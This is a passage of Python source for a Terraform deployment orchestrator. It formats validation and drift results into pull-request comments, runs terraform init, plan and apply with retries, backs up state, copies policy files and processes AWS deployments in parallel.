            comment += f"| 📝 Code Formatting | {format_status} | Terraform fmt standards |\n"
            comment += f"| 🔐 ARN Validation | {arn_status} | Account ID matching |\n"
            comment += f"| 📄 Policy Validation | {policy_status} | JSON syntax & AWS rules |\n"
            comment += f"| 🏷️  Resource Names | {resource_status} | Name consistency check |\n"
            comment += f"| 🛡️  Deletion Protection | {deletion_status} | Production safety |\n"
            comment += "\n"
            
            # Errors section
            if val_errors:
                comment += "### 🚫 CRITICAL ERRORS (Must Fix)\n\n"
                comment += "The following issues **BLOCK** deployment and must be resolved:\n\n"
                for i, error in enumerate(val_errors, 1):
                    comment += f"{i}. {error}\n"
                comment += "\n"
                
                comment += "**📋 How to Fix:**\n"
                comment += "1. Review each error message above\n"
                comment += "2. Update your tfvars, policies, or resource configurations\n"
                comment += "3. Run `terraform fmt -recursive` to fix formatting\n"
                comment += "4. Push changes to re-trigger validation\n\n"
            
            # Warnings section
            if val_warnings:
                comment += "### ⚠️  WARNINGS (Review Recommended)\n\n"
                comment += "The following issues won't block deployment but should be reviewed:\n\n"
                for i, warning in enumerate(val_warnings, 1):
                    comment += f"{i}. {warning}\n"
                comment += "\n"
            
            # Production emphasis
            if deployment.get('environment', '').lower() in ['production', 'prod', 'prd']:
                comment += "### 🚨 PRODUCTION ENVIRONMENT ALERT\n\n"
                comment += "⚠️  **This is a PRODUCTION deployment!**\n\n"
                comment += "**Extra precautions:**\n"
                comment += "- All warnings must be reviewed by team lead\n"
                comment += "- Resource deletions require explicit approval\n"
                comment += "- State backup is automatically created\n"
                comment += "- Automatic rollback on failure\n\n"
            
            comment += "---\n\n"
        
        # Add drift detection results (if this was an apply with drift check)
        if result.get('drift_detected'):
            comment += "## 🔍 Infrastructure Drift Detection\n\n"
            if result.get('has_drift', False):
                comment += "⚠️  **Drift Detected**: Infrastructure has diverged from Terraform state\n\n"
                comment += "This could be due to:\n"
                comment += "- Manual changes made outside Terraform\n"
                comment += "- Previous failed deployments\n"
                comment += "- External systems modifying resources\n\n"
                comment += "**Action taken**: Applied changes to bring infrastructure back in sync.\n\n"
            else:
                comment += "✅ **No Drift**: Infrastructure matches Terraform state perfectly\n\n"
        
        comment += "---\n\n"
        
        # Add resource summary
        if outputs['resources_created']:
            comment += f"**📦 Resources Created ({len(outputs['resources_created'])}):**\n"
            for resource in outputs['resources_created'][:10]:  # Limit to 10
                comment += f"- `{resource}`\n"
            if len(outputs['resources_created']) > 10:
                comment += f"- ... and {len(outputs['resources_created']) - 10} more\n"
            comment += "\n"
        
        if outputs['resources_modified']:
            comment += f"**🔧 Resources Modified ({len(outputs['resources_modified'])}):**\n"
            for resource in outputs['resources_modified'][:5]:
                comment += f"- `{resource}`\n"
            comment += "\n"
        
        # Add service-specific details
        if outputs['resource_details']:
            comment += "**🎯 Service Details:**\n"
            for service, details in outputs['resource_details'].items():
                if details['arns']:
                    comment += f"**{service.upper()}:**\n"
                    for arn in details['arns'][:3]:  # Limit ARNs
                        comment += f"- ARN: `{arn}`\n"
                if details['names']:
                    for name in details['names'][:3]:  # Limit names  
                        comment += f"- Name: `{name}`\n"
            comment += "\n"
        
        # Add terraform output details - REDACTED
        comment += f"""<details><summary><strong>🔍 Terraform Output (Sensitive data redacted)</strong></summary>

```terraform
{redacted_output[:3000]}
```

</details>

---

## 🔒 Security & Compliance Features

### ✅ Validation Pipeline (5 Layers)
1. **Terraform Format Check** - Code formatting standards
2. **JSON Syntax Validation** - Policy file correctness
3. **ARN Account Matching** - Cross-account access prevention
4. **Resource Name Consistency** - Copy-paste error detection
5. **Deletion Protection** - Production safety guardrails

### 🛡️ Safety Mechanisms
- ✅ **Drift Detection**: Plan before apply to show changes
- ✅ **State Backup**: Automatic backup before every apply
- ✅ **Automatic Rollback**: Restore state on failure
- ✅ **Retry Logic**: 3 retries with exponential backoff for transient errors
- ✅ **Workspace Cleanup**: Automatic old workspace removal (24h retention)
- ✅ **Production Deletion Protection**: Manual approval required for resource deletions

### 🔐 Data Privacy
- ✅ **Sensitive data redacted** from PR comments (ARNs, Account IDs, IP addresses)
- ✅ **Full unredacted logs** saved to encrypted S3 audit log
- ✅ **AES256 encryption** for all S3 audit logs and state backups
- ✅ **Compliance ready**: SOC2, HIPAA, PCI-DSS audit trails

### 📋 Audit Trail
- **Location**: `s3://terraform-elb-mdoule-poc/audit-logs/{deployment['account_name']}/{deployment['project']}/`
- **Retention**: 7 years (compliance requirement)
- **Format**: JSON with full unredacted output

### 📚 Documentation
- [Security Features](https://github.com/Terraform-centilazed-pipline/centerlized-pipline-/blob/main/docs/SECURITY-FEATURES.md)
- [Terraform Best Practices](https://github.com/Terraform-centilazed-pipline/centerlized-pipline-/blob/main/docs/TERRAFORM-BEST-PRACTICES.md)
- [Orchestrator Enhancements](https://github.com/Terraform-centilazed-pipline/centerlized-pipline-/blob/main/scripts/ORCHESTRATOR-V2-ENHANCEMENTS.md)

---

*🤖 Generated by Enhanced Terraform Orchestrator v{orchestrator_ver} | Enterprise-Grade Deployment Pipeline*
"""
        
        return comment

    def _process_deployment_enhanced(self, deployment: Dict, action: str) -> Dict:
        """Enhanced deployment processing with dynamic backend and better error handling - Version 2.0"""
        try:
            # Reset validation lists for this deployment
            self.validation_warnings = []
            self.validation_errors = []
            
            debug_print(f"Processing deployment (v{ORCHESTRATOR_VERSION}): {deployment}")
            
            # Resolve tfvars file path
            tfvars_file = Path(deployment['file'])
            if not tfvars_file.is_absolute():
                tfvars_file = self.working_dir / tfvars_file
            
            # Validate tfvars file syntax
            is_valid, validation_msg = self._validate_tfvars_file(tfvars_file)
            if not is_valid:
                return {
                    'deployment': deployment,
                    'success': False,
                    'error': f"Tfvars validation failed: {validation_msg}",
                    'output': validation_msg,
                    'backend_key': 'unknown',
                    'services': [],
                    'action': action
                }
            
            # COMPREHENSIVE VALIDATION - ARNs, Policies, Resource Names
            validation_warnings, validation_errors = self._comprehensive_validation(tfvars_file, deployment)
            
            # Store for PR comments
            self.validation_warnings.extend(validation_warnings)
            self.validation_errors.extend(validation_errors)
            
            # BLOCK DEPLOYMENT if validation errors found
            if validation_errors:
                error_msg = "\n".join(validation_errors)
                print(f"\n❌ VALIDATION FAILED - DEPLOYMENT BLOCKED:\n{error_msg}\n")
                
                # Create detailed error summary for PR comment
                error_summary = f"Validation failed with {len(validation_errors)} error(s)"
                if len(validation_errors) == 1:
                    # Single error - show it directly
                    error_summary = validation_errors[0]
                elif len(validation_errors) <= 3:
                    # Few errors - show all
                    error_summary = "; ".join(validation_errors)
                else:
                    # Many errors - show first 2 and count
                    error_summary = f"{validation_errors[0]}; {validation_errors[1]}; ... +{len(validation_errors)-2} more"
                
                return {
                    'deployment': deployment,
                    'success': False,
                    'error': error_summary[:500],  # Limit to 500 chars for PR comment
                    'error_detail': error_msg,  # Full details for expandable section
                    'output': f"🚫 DEPLOYMENT BLOCKED\n\n{error_msg}",
                    'backend_key': 'unknown',
                    'services': [],
                    'action': action,
                    'validation_warnings': validation_warnings,
                    'validation_errors': validation_errors
                }
            
            # Show warnings but continue
            if validation_warnings:
                warn_msg = "\n".join(validation_warnings)
                print(f"\n⚠️  VALIDATION WARNINGS:\n{warn_msg}\n")
            
            # Detect services from tfvars
            # CRITICAL FIX: Ensure we're reading the correct file by clearing cache first
            debug_print(f"🔍 About to detect services from: {tfvars_file}")
            debug_print(f"   Absolute path: {tfvars_file.resolve()}")
            debug_print(f"   File exists: {tfvars_file.exists()}")
            debug_print(f"   Working dir: {self.working_dir}")
            
            services = self._detect_services_from_tfvars(tfvars_file)
            
            # CRITICAL: Validate services were detected - if not, try direct read
            if not services:
                debug_print(f"⚠️  CRITICAL: No services detected from cached read!")
                debug_print(f"   Attempting DIRECT file read (bypassing cache)...")
                try:
                    direct_content = tfvars_file.read_text()
                    debug_print(f"   ✅ Direct read successful, length: {len(direct_content)}")
                    debug_print(f"   Contains 's3_buckets =': {'s3_buckets =' in direct_content or 's3_buckets=' in direct_content}")
                    debug_print(f"   Contains 'iam_roles =': {'iam_roles =' in direct_content or 'iam_roles=' in direct_content}")
                    debug_print(f"   Contains 'iam_policies =': {'iam_policies =' in direct_content or 'iam_policies=' in direct_content}")
                    
                    # FORCE detection with direct content (bypass cache)
                    detected_services_direct = set()
                    for tfvars_key, service in self.service_mapping.items():
                        pattern = rf'\b{tfvars_key}\s*='
                        if re.search(pattern, direct_content):
                            detected_services_direct.add(service)
                            debug_print(f"   ✅ DIRECT DETECTION: {service} (from {tfvars_key})")
                    
                    if detected_services_direct:
                        services = list(detected_services_direct)
                        debug_print(f"   ✅ RECOVERY: Services detected from direct read: {services}")
                    else:
                        debug_print(f"   ❌ FAILED: No services found even with direct read!")
                except Exception as e:
                    debug_print(f"   ❌ Direct read failed: {e}")
            
            # Generate dynamic backend key with resource name
            backend_key = self._generate_dynamic_backend_key(deployment, services, tfvars_file)
            
            # Copy required files to working directory
            # Use deployment-specific directory to avoid race conditions in parallel execution
            main_dir = self.project_root
            deployment_name = f"{deployment['account_name']}-{deployment['project']}"
            
            # Create deployment-specific workspace
            deployment_workspace = main_dir / f".terraform-workspace-{deployment_name}"
            
            # Always clean and recreate workspace to avoid lock file conflicts
            if deployment_workspace.exists():
                shutil.rmtree(deployment_workspace)
                debug_print(f"Cleaned existing workspace: {deployment_workspace}")
            
            deployment_workspace.mkdir(exist_ok=True)
            debug_print(f"Created fresh workspace: {deployment_workspace}")
            
            tfvars_dest = deployment_workspace / "terraform.tfvars"
            shutil.copy2(tfvars_file, tfvars_dest)
            debug_print(f"Copied {tfvars_file} -> {tfvars_dest}")
            
            # Copy policy JSON files referenced in tfvars (if any)
            try:
                debug_print(f"About to call _copy_referenced_policy_files")
                self._copy_referenced_policy_files(tfvars_file, deployment_workspace, deployment)
                debug_print(f"Finished calling _copy_referenced_policy_files")
            except Exception as copy_err:
                print(f"⚠️ Exception in _copy_referenced_policy_files: {copy_err}")
                import traceback
                traceback.print_exc()
            
            # Copy main.tf and other terraform files to workspace
            for tf_file in main_dir.glob("*.tf"):
                shutil.copy2(tf_file, deployment_workspace / tf_file.name)
                debug_print(f"Copied {tf_file.name} to workspace")
            
            # Initialize Terraform with dynamic backend
            init_cmd = [
                'init', '-input=false',
                f'-backend-config=key={backend_key}',
                f'-backend-config=region=us-east-1'
            ]
            
            # AUTO-MIGRATION: Check if we need to migrate from old backend key
            self._auto_migrate_state_if_needed(backend_key, services, deployment)
            
            print(f"🔄 Initializing Terraform with backend key: {backend_key}")
            print(f"🔒 State locking enabled via Terraform built-in lockfile (use_lockfile=true)")
            
            init_result = self._run_terraform_command(init_cmd, deployment_workspace)
            if init_result['returncode'] != 0:
                error_msg = f"Terraform init failed: {init_result.get('stderr', init_result['output'])}"
                return {
                    'deployment': deployment,
                    'success': False,
                    'error': error_msg,
                    'output': init_result['output'],
                    'backend_key': backend_key,
                    'services': services,
                    'action': action
                }
            
            # CLEANUP OLD WORKSPACES
            self._cleanup_old_workspaces(max_age_hours=24)
            
            # DRIFT DETECTION & DELETION PROTECTION BEFORE APPLY
            if action == "apply":
                print(f"🔍 Running drift detection before apply...")
                drift_cmd = ['plan', '-detailed-exitcode', '-input=false', '-var-file=terraform.tfvars', '-no-color']
                drift_result = self._run_terraform_command(drift_cmd, deployment_workspace)
                
                if drift_result['returncode'] == 2:
                    print(f"✅ Drift detected - changes will be applied")
                    
                    # Check for deletions
                    del_warnings, del_errors = self._detect_resource_deletions(
                        drift_result['output'],
                        deployment.get('environment', 'unknown')
                    )
                    
                    if del_errors:
                        print(f"⚠️  DELETION PROTECTION TRIGGERED")
                        for error in del_errors:
                            print(f"   {error}")
                        
                        return {
                            'deployment': deployment,
                            'success': False,
                            'error': 'Production deletion protection - manual approval required',
                            'output': f"🛑 BLOCKED: Production resource deletion\n\n{'\n'.join(del_errors)}",
                            'backend_key': backend_key,
                            'services': services,
                            'action': action,
                            'validation_warnings': validation_warnings,
                            'validation_errors': del_errors
                        }
                    
                    if del_warnings:
                        for warning in del_warnings:
                            print(f"   {warning}")
                elif drift_result['returncode'] == 0:
                    print(f"ℹ️  No changes detected - infrastructure is in sync")
                else:
                    print(f"⚠️  Drift detection failed with exit code {drift_result['returncode']}")
            
            # BACKUP STATE FILE BEFORE APPLY
            deployment_name = f"{deployment['account_name']}-{deployment['project']}"
            backup_info = None
            
            if action == "apply":
                print(f"💾 Creating state backup before apply...")
                backup_success, backup_info = self._backup_state_file(backend_key, deployment_name)
                if backup_success:
                    print(f"✅ State backup created: {backup_info}")
                else:
                    print(f"⚠️ Warning: State backup failed, but continuing with apply")
            
            # Run terraform action
            if action == "plan":
                # Save plan to file for JSON conversion
                plan_filename = f"{deployment['account_name']}-{deployment['project']}.tfplan"
                plan_file = deployment_workspace / plan_filename
                cmd = ['plan', '-detailed-exitcode', '-input=false', '-var-file=terraform.tfvars', '-no-color', f'-out={plan_filename}']
                print(f"📋 Running terraform plan...")
            elif action == "apply":
                cmd = ['apply', '-auto-approve', '-input=false', '-var-file=terraform.tfvars', '-no-color']
                print(f"🚀 Running terraform apply...")
            else:
                cmd = [action, '-input=false', '-var-file=terraform.tfvars', '-no-color']
            
            result = self._run_terraform_command(cmd, deployment_workspace)
            
            # SMART ROLLBACK - Only if state file is corrupted
            if action == "apply" and result['returncode'] != 0:
                print(f"\n❌ Apply failed! Analyzing state file...")
                
                # Check if state file is still valid
                state_valid = self._verify_state_file_integrity(deployment_workspace)
                
                if state_valid:
                    # State file is correct - Terraform already tracked everything properly
                    print(f"✅ State file is accurate - Terraform tracked all successful resources")
                    print(f"ℹ️  No rollback needed - state matches AWS reality")
                    print(f"\n💡 Next Steps:")
                    print(f"   1. Review the error above")
                    print(f"   2. Fix the configuration issue")
                    print(f"   3. Re-run terraform apply")
                    print(f"   4. Only failed resources will be retried")
                    
                    result['output'] += (
                        f"\n\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"✅ STATE FILE STATUS: VALID\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"Terraform successfully tracked all resources that were created.\n"
                        f"No rollback necessary - state file matches AWS reality.\n\n"
                        f"What this means:\n"
                        f"  • Successfully created resources are tracked in state\n"
                        f"  • Failed resources are NOT in state (correct behavior)\n"
                        f"  • Fix the error and re-run apply\n"
                        f"  • Terraform will only retry the failed resources\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
                    )
                else:
                    # State file corrupted - need to rollback
                    print(f"⚠️  State file is CORRUPTED! Attempting rollback...")
                    rollback_success = self._rollback_state_file(deployment_name)
                    if rollback_success:
                        print(f"✅ State file restored from backup")
                        result['output'] += f"\n\n⚠️ ROLLBACK PERFORMED: State file was corrupted and restored from backup"
                    else:
                        print(f"❌ CRITICAL: State file corrupted and backup failed!")
                        result['output'] += f"\n\n❌ CRITICAL: State file corrupted and rollback failed - manual recovery required"
            
            # Determine success based on action and exit code
            if action == "plan":
                success = result['returncode'] in [0, 2]  # 0=no changes, 2=changes detected
                has_changes = result['returncode'] == 2
                
                print(f"📊 Terraform Plan Exit Code: {result['returncode']}")
                print(f"   ✅ Success: {success}")
                print(f"   🔄 Has Changes: {has_changes}")
                
                # Double-check by looking at output
                if not has_changes and ('will be created' in result['output'] or 'will be updated' in result['output'] or 'will be destroyed' in result['output']):
                    print(f"⚠️ WARNING: Exit code was 0 but output shows changes! Forcing has_changes=True")
                    has_changes = True
                
                # Generate JSON plan and markdown for OPA validation if plan succeeded
                if success and plan_file.exists():
                    # Create JSON plan
                    json_dir = self.working_dir / "terraform-json"
                    json_dir.mkdir(exist_ok=True)
                    
                    json_filename = f"{deployment['account_name']}-{deployment['project']}.json"
                    json_file = json_dir / json_filename
                    
                    # IMPORTANT: Use full path to plan file (not just filename)
                    show_result = self._run_terraform_command(['show', '-json', str(plan_file)], deployment_workspace)
                    if show_result['returncode'] == 0:
                        with open(json_file, 'w') as f:
                            f.write(show_result['stdout'])
                        print(f"📄 Generated JSON plan: {json_file}")
                        debug_print(f"JSON plan saved to: {json_file}")
                        
                        # Parse JSON to detect changes as backup method
                        try:
                            import json as json_module
                            plan_data = json_module.loads(show_result['stdout'])
                            resource_changes = plan_data.get('resource_changes', [])
                            actual_changes = [rc for rc in resource_changes if rc.get('change', {}).get('actions', []) != ['no-op']]
                            
                            if actual_changes and not has_changes:
                                print(f"⚠️ OVERRIDE: JSON shows {len(actual_changes)} resource changes but exit code was 0")
                                print(f"   Setting has_changes=True based on JSON analysis")
                                has_changes = True
                            
                            print(f"📊 JSON Analysis: {len(actual_changes)} resources with changes out of {len(resource_changes)} total")
                        except Exception as parse_err:
                            print(f"⚠️ Could not parse JSON plan for change detection: {parse_err}")
                    else:
                        print(f"⚠️ Warning: Failed to generate JSON plan for {deployment['account_name']}")
                        debug_print(f"terraform show -json failed: {show_result.get('stderr', 'unknown error')}")
                    
                    # Create markdown plan for PR comments
                    markdown_dir = self.working_dir / "plan-markdown"
                    markdown_dir.mkdir(exist_ok=True)
                    
                    markdown_filename = f"{deployment['account_name']}-{deployment['project']}.md"
                    markdown_file = markdown_dir / markdown_filename
                    
                    show_md_result = self._run_terraform_command(['show', plan_filename], deployment_workspace)
                    if show_md_result['returncode'] == 0:
                        with open(markdown_file, 'w') as f:
                            f.write(f"## Terraform Plan: {deployment['account_name']}/{deployment['project']}\n\n")
                            f.write(f"**Backend Key:** `{backend_key}`\n\n")
                            f.write(f"**Services:** {', '.join(services)}\n\n")
                            f.write("```terraform\n")
                            f.write(show_md_result['stdout'])
                            f.write("\n```\n")
                        print(f"📝 Generated markdown plan: {markdown_file}")
                        debug_print(f"Markdown plan saved to: {markdown_file}")
                    else:
                        print(f"⚠️ Warning: Failed to generate markdown plan for {deployment['account_name']}")
                        debug_print(f"terraform show failed: {show_md_result.get('stderr', 'unknown error')}")
            else:
                success = result['returncode'] == 0
                has_changes = True
            
            # Print detailed error if command failed
            if not success:
                print(f"\n❌ Terraform {action} failed with exit code {result['returncode']}")
                print(f"📋 Error output:")
                print(result.get('stderr', result.get('output', 'No error output available')))
                if DEBUG:
                    print(f"\n📋 Full stdout:")
                    print(result.get('stdout', 'No stdout available'))
            
            # Build result dict
            final_result = {
                'deployment': deployment,
                'success': success,
                'has_changes': has_changes,
                'output': result['output'],
                'stderr': result.get('stderr', ''),
                'stdout': result.get('stdout', ''),
                'backend_key': backend_key,
                'services': services,
                'action': action,
                'error': None if success else f"{action} failed with exit code {result['returncode']}",
                'error_detail': result.get('stderr', result.get('output', '')) if not success else None,
                'orchestrator_version': ORCHESTRATOR_VERSION,
                'backup_info': backup_info if action == 'apply' else None,
                'validation_warnings': self.validation_warnings,
                'validation_errors': self.validation_errors
            }
            
            # SAVE AUDIT LOG (full unredacted output for compliance)
            print(f"📋 Saving audit log to encrypted S3...")
            audit_success = self._save_audit_log(deployment, final_result, action)
            if audit_success:
                print(f"✅ Audit log saved successfully")
            else:
                print(f"⚠️ Warning: Audit log save failed")
            
            return final_result
            
        except Exception as e:
            return {
                'deployment': deployment,
                'success': False,
                'error': str(e),
                'output': f"Exception during {action}: {e}",
                'backend_key': backend_key if 'backend_key' in locals() else 'unknown',
                'services': services if 'services' in locals() else [],
                'action': action
            }

    def _run_terraform_command(self, cmd: List[str], cwd: Path, retries: int = 3) -> Dict:
        """Run terraform command with retry logic for transient failures"""
        full_cmd = ['terraform'] + cmd
        debug_print(f"Running: {' '.join(full_cmd)} in {cwd}")
        
        last_error = None
        for attempt in range(retries):
            try:
                if attempt > 0:
                    wait_time = 2 ** attempt  # Exponential backoff: 2s, 4s, 8s
                    print(f"⏳ Retry attempt {attempt + 1}/{retries} after {wait_time}s wait...")
                    time.sleep(wait_time)
                
                import os
                env = getattr(self, '_terraform_env', os.environ.copy())
                
                result = subprocess.run(
                    full_cmd,
                    cwd=cwd,
                    capture_output=True,
                    text=True,
                    env=env,
                    timeout=1800  # 30 minutes timeout
                )
                
                # Check for transient errors
                transient_errors = [
                    'connection reset',
                    'timeout',
                    'temporary failure',
                    'service unavailable',
                    'rate limit',
                    'TooManyRequestsException'
                ]
                
                output = result.stdout + result.stderr
                is_transient = any(err.lower() in output.lower() for err in transient_errors)
                
                # Return immediately if successful or non-transient error
                if result.returncode == 0 or (result.returncode != 0 and not is_transient):
                    return {
                        'returncode': result.returncode,
                        'stdout': result.stdout,
                        'stderr': result.stderr,
                        'output': output
                    }
                
                # Store transient error for retry
                last_error = output
                print(f"⚠️  Transient error detected: {output[:200]}...")
                
            except subprocess.TimeoutExpired:
                return {
                    'returncode': 124,
                    'stdout': '',
                    'stderr': 'Command timed out after 30 minutes',
                    'output': 'Command timed out after 30 minutes'
                }
            except Exception as e:
                last_error = str(e)
                print(f"⚠️  Exception on attempt {attempt + 1}: {str(e)}")
        
        # All retries exhausted
        return {
            'returncode': 1,
            'stdout': '',
            'stderr': last_error or 'Unknown error',
            'output': f"Command failed after {retries} attempts. Last error: {last_error}"
        }

    def _copy_referenced_policy_files(self, tfvars_file: Path, dest_dir: Path, deployment: Dict):
        """
        Copy policy JSON files referenced in tfvars to the destination directory.
        Maintains the same directory structure so Terraform can find them.
        """
        print(f"🔍 ENTERING _copy_referenced_policy_files for: {tfvars_file}")
        debug_print(f"🔍 _copy_referenced_policy_files called for: {tfvars_file}")
        debug_print(f"   Dest dir: {dest_dir}")
        debug_print(f"   Working dir: {self.working_dir}")
        
        try:
            # Use cached tfvars content for performance
            tfvars_content = self._read_tfvars_cached(tfvars_file)
            
            debug_print(f"   Tfvars content length: {len(tfvars_content)} bytes")
            
            # Find all JSON file references: bucket_policy_file = "path/to/file.json"
            # Matches any path structure (S3/, Accounts/, KMS/, etc.)
            json_pattern = r'["\']([^"\']+\.json)["\']'
            json_files = re.findall(json_pattern, tfvars_content)
            
            debug_print(f"   Regex pattern: {json_pattern}")
            debug_print(f"   JSON files found by regex: {json_files}")
            
            if not json_files:
                debug_print("No policy JSON files referenced in tfvars")
                return
            
            debug_print(f"Found {len(json_files)} policy file references in tfvars")
            
            for json_file_path in json_files:
                filename = Path(json_file_path).name
                debug_print(f"Looking for policy file: {filename}")
                
                source_file = None
                
                # Try the exact path from tfvars (relative to working_dir)
                candidate1 = self.working_dir / json_file_path
                if candidate1.exists():
                    source_file = candidate1
                    debug_print(f"✅ Found policy file: {candidate1}")
                else:
                    # Look in the deployment directory
                    deployment_dir = Path(deployment['deployment_dir'])
                    if not deployment_dir.is_absolute():
                        deployment_dir = self.working_dir / deployment_dir
                    
                    candidate2 = deployment_dir / filename
                    if candidate2.exists():
                        source_file = candidate2
                        debug_print(f"✅ Found policy file: {candidate2}")
                
                if source_file:
                    # Destination preserves the tfvars path (what terraform expects)
                    dest_file = dest_dir / json_file_path
                    dest_file.parent.mkdir(parents=True, exist_ok=True)
                    shutil.copy2(source_file, dest_file)
                    print(f"✅ Copied policy file: {filename}")
                    debug_print(f"   From: {source_file}")
                    debug_print(f"   To:   {dest_file}")
                else:
                    print(f"⚠️ Warning: Policy file '{filename}' not found")
                    
        except Exception as e:
            print(f"⚠️ Warning: Error copying policy files: {e}")
            debug_print(f"Error in _copy_referenced_policy_files: {e}")
            import traceback
            debug_print(traceback.format_exc())


    
    def execute_deployments(self, deployments: List[Dict], action: str = "plan") -> Dict:
        """Execute terraform deployments - PARALLEL processing with thread pool"""
        from concurrent.futures import ThreadPoolExecutor, as_completed
        import threading
        
        results = {
            'successful': [],
            'failed': [],
            'summary': {}
        }
        
        # Determine optimal number of parallel workers
        # Use CPU cores × 2 (Terraform is I/O bound, not CPU bound)
        # But cap at 5 to avoid AWS API rate limits
        import os
        cpu_count = os.cpu_count() or 2
        optimal_workers = cpu_count * 2  # 2 cores = 4 workers, 4 cores = 8 workers
        max_workers = min(optimal_workers, 5, len(deployments)) if len(deployments) > 1 else 1
        
        print(f"🚀 Starting {action} for {len(deployments)} deployments")
        print(f"💻 Detected {cpu_count} CPU cores → {optimal_workers} optimal workers (using {max_workers})")
        
        if max_workers == 1:
            # Single deployment - no need for threading overhead
            deployment = deployments[0]
            print(f"🔄 [1/1] Processing {deployment['account_name']}/{deployment['region']}/{deployment['project']}")
            
            try:
                result = self._process_deployment_enhanced(deployment, action)
                if result['success']:
                    results['successful'].append(result)
                    print(f"✅ {deployment['account_name']}/{deployment['region']}: Success")
                else:
                    results['failed'].append(result)
                    print(f"❌ {deployment['account_name']}/{deployment['region']}: Failed")
                    if DEBUG:
                        print(f"🔍 Error details: {result.get('error', 'No error message')}")
            except Exception as e:
                error_result = {
                    'deployment': deployment,
                    'success': False,
                    'error': str(e),
                    'output': f"Exception during processing: {e}"
                }
                results['failed'].append(error_result)
                print(f"💥 {deployment['account_name']}/{deployment['region']}: Exception - {e}")
        else:
            # Multiple deployments - use parallel execution
            completed = 0
            lock = threading.Lock()
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Submit all deployments to thread pool
                future_to_deployment = {
                    executor.submit(self._process_deployment_enhanced, dep, action): dep
                    for dep in deployments
                }
                
                # Process results as they complete (30 min timeout per deployment)
                for future in as_completed(future_to_deployment):
                    deployment = future_to_deployment[future]
                    completed += 1
                    
                    try:
                        result = future.result(timeout=1800)
                        
                        with lock:  # Thread-safe result collection
                            if result['success']:
                                results['successful'].append(result)
                                print(f"✅ [{completed}/{len(deployments)}] {deployment['account_name']}/{deployment['region']}: Success")
                            else:
                                results['failed'].append(result)
                                print(f"❌ [{completed}/{len(deployments)}] {deployment['account_name']}/{deployment['region']}: Failed")
                                if DEBUG:
                                    print(f"🔍 Error details: {result.get('error', 'No error message')}")
                    
                    except concurrent.futures.TimeoutError:
                        with lock:
                            error_result = {
                                'deployment': deployment,
                                'success': False,
                                'error': 'Deployment timed out after 30 minutes',
                                'output': 'Deployment exceeded maximum allowed time'
                            }
                            results['failed'].append(error_result)
                            print(f"⏱️  [{completed}/{len(deployments)}] {deployment['account_name']}/{deployment['region']}: Timeout")
                    
                    except Exception as e:
                        with lock:
                            error_result = {
                                'deployment': deployment,
                                'success': False,
                                'error': str(e),
                                'output': f"Exception during processing: {e}"
                            }
                            results['failed'].append(error_result)
                            print(f"💥 [{completed}/{len(deployments)}] {deployment['account_name']}/{deployment['region']}: Exception - {e}")
        
        results['summary'] = {
            'total': len(deployments),
            'successful': len(results['successful']),
            'failed': len(results['failed']),
            'action': action
        }
        
        print(f"📊 Summary: {results['summary']['successful']} successful, {results['summary']['failed']} failed")
        return results


# Keep the rest of the original class structure for compatibility
class TerraformOrchestrator(EnhancedTerraformOrchestrator):
    """Compatibility wrapper"""
    pass


def main():
    parser = argparse.ArgumentParser(description="Enhanced Terraform Deployment Orchestrator v2.0")
    parser.add_argument('action', choices=['discover', 'plan', 'apply', 'destroy'], help='Action to perform')
    parser.add_argument("--account", help="Filter by account name")
    parser.add_argument("--region", help="Filter by region")  
    parser.add_argument("--environment", help="Filter by environment")
    parser.add_argument("--changed-files", help="Space-separated changed files")
    parser.add_argument("--output-summary", help="JSON output file")
    parser.add_argument("--working-dir", help="Working directory for deployment discovery")
    parser.add_argument("--dry-run", action="store_true", help="Show what would be deployed without executing")
    parser.add_argument("--debug", action="store_true", help="Enable debug output")
    
    args = parser.parse_args()
    
    global DEBUG
    DEBUG = args.debug
    
    try:
        orchestrator = EnhancedTerraformOrchestrator(working_dir=args.working_dir)
        
        # Build filters
        filters = {}
        if args.account:
            filters['account_name'] = args.account
        if args.region:
            filters['region'] = args.region
        if args.environment:
            filters['environment'] = args.environment
        
        # Find deployments
        changed_files = None
        if args.changed_files:
            changed_files = args.changed_files.split()
        
        deployments = orchestrator.find_deployments(changed_files=changed_files, filters=filters or None)
        
        if args.action == 'discover':
            # Discovery mode - output deployment information
            print(f"\n🔍 Found {len(deployments)} deployments")
            
            results = {
                'deployments': deployments,
                'total': len(deployments),
                'total_deployments': len(deployments)
            }
            
            for dep in deployments:
                deployment_key = f"{dep['account_name']}-{dep['region']}-{dep['project']}"
                dep['deployment_key'] = deployment_key
                dep['tfvars_file'] = dep['file']
                print(f"   - {deployment_key}: {dep['file']}")
            
            if args.output_summary:
                with open(args.output_summary, 'w') as f:
                    json.dump(results, f, indent=2)
            
            return 0
        
        # Execute deployments
        if not deployments:
            print("\n📋 No deployments found")
            return 0
        
        if args.dry_run:
            print("\n🔍 Dry run mode - no actions will be performed")
            for dep in deployments:
                print(f"   Would process: {dep['account_name']}/{dep['region']}/{dep['project']}")
            return 0
        
        print(f"\n🚀 Processing {len(deployments)} deployments with action: {args.action}")
        results = orchestrator.execute_deployments(deployments, args.action)
        
        # Save summary
        if args.output_summary:
            with open(args.output_summary, 'w') as f:
                json.dump(results, f, indent=2)
        
        print(f"\n✅ Completed: {results['summary']['successful']} successful, {results['summary']['failed']} failed")
        
        return 0 if results['summary']['failed'] == 0 else 1
        
    except Exception as e:
        print(f"❌ Error: {e}")
        import traceback
        if DEBUG:
            traceback.print_exc()
        return 1

if __name__ == "__main__":
    sys.exit(main())